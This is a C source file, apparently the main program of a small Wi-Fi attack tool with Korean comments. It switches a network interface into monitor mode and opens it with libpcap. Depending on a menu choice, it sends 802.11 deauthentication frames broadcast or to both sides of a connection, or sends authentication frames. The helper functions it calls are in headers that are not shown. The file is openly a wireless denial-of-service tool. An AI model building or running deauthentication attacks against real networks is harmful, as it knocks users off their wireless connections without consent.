#include <pcap.h>
#include "attack_frame.h" // 비콘프레임 관련
#include "utils.h" //파일 및 모니터모드 관련


int main(int argc, char *argv[])
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

    start_monitor_mode(argv[1]);

    int chosen = choose_deauth(argc, argv);

    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);

    if(handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
        return 2;
    }
    Deauthentication_Frame deauth_frame = {0};
    Authentication_Frame auth_frame = {0};

    switch(chosen)
    {
        case 1:
            return 0;

        case 2:
            fill_deauth_frame(deauth_frame);
            send_deauth_broadcast(deauth_frame, handle, argv);
            return 0;

        case 3:
            fill_deauth_frame(deauth_frame);
            send_deauth_to_bidirection(deauth_frame, handle, argv);
            return 0;

        case 4:
            fill_auth_frame(auth_frame);
            send_auth(auth_frame, handle, argv);
            return 0;

        case 5:
            return 0;
     }
}